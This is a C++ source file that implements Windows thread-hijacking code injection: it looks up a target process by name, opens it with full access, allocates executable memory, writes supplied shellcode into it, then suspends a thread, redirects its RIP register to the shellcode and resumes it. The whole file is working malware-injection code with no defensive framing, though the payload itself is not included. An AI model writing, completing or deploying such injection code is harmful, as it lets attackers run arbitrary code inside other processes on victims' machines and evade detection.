#include "ThrdHijack.hpp"

// This function gets process id with its name
int getProc(const char* procID) {

	HANDLE procSnap;
	PROCESSENTRY32 pe;
	BOOL procEnum;
	int pid = 0;

	// Has to be declared for Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Taking snapshot of all processes
	procSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	// Taking first process from the snapshot list
	procEnum = Process32First(procSnap, &pe);

	// Searching for wanted process
	while (procEnum) {
		if (strcmp(procID, (char*)pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		else {
			procEnum = Process32Next(procSnap, &pe);
		}
	}

	// Closing the snapshot handle
	CloseHandle(procSnap);

	// Return PID number of the process
	return pid;
}

void getSetProc(int pid, unsigned char* shl, int shlLen) {

	THREADENTRY32 te;
	CONTEXT ct;
	HANDLE opProc, thrSnap, opThr = NULL;
	LPVOID memAlloc;
	BOOL thrEnum;

	// Has to be declared to handle and control the thread
	ct.ContextFlags = CONTEXT_FULL;
	te.dwSize = sizeof(THREADENTRY32);

	// Opening process, allocating memory and copying the shellcode
	opProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	memAlloc = VirtualAllocEx(opProc, NULL, shlLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(opProc, memAlloc, shl, shlLen, NULL);

	// Taking snapshot of all threads and handling the first one
	thrSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	thrEnum = Thread32First(thrSnap, &te);

	// Searching for a thread that belongs to the process that we want
	while (thrEnum) {
		if (pid == te.th32OwnerProcessID) {
			opThr = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			break;
		}
		else {
			thrEnum = Thread32Next(thrSnap, &te);
		}
	}

	// Suspending the thread
	SuspendThread(opThr);

	// Getting its content
	GetThreadContext(opThr, &ct);

	// Changing the value of RIP register to the allocated area where the shellcode lies
	ct.Rip = (DWORD_PTR)memAlloc;

	// Making the changes effective
	SetThreadContext(opThr, &ct);

	// Resuming the thread
	ResumeThread(opThr);

	// Closing the snapshot handle
	CloseHandle(opProc);
}